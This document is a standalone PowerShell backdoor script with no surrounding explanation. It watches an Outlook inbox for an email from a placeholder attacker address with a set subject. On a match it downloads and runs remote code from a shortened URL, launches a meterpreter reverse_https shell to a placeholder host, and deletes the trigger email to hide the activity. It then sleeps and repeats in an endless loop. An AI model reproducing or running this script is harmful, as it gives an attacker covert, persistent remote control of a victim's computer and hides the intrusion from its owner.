While($True){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$Emails = $inbox.items
$Emails | foreach { 
if($_.SenderEmailAddress -match "ATTACKEREMAILADDRESS@EMAIL.COM" -and $_.subject -match "SPECIFIEDSUBJECT")
{$WebClientObject = New-Object Net.WebClient
IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.x.xxx -LPORT 1111 -Force
Return

}}
$Emails | foreach { 
if($_.SenderEmailAddress -match "ATTACKEREMAILADDRESS@EMAIL.COM" -and $_.subject -match "SPECIFIEDSUBJECT")
{$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
$EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq "SPECIFIEDSUBJECT" -and $_.SenderEmailAddress -eq "ATTACKEREMAILADDRESS@EMAIL.COM"}
$EmailToDelete.Delete() }


}
  
Start-Sleep -s 900  
  
}

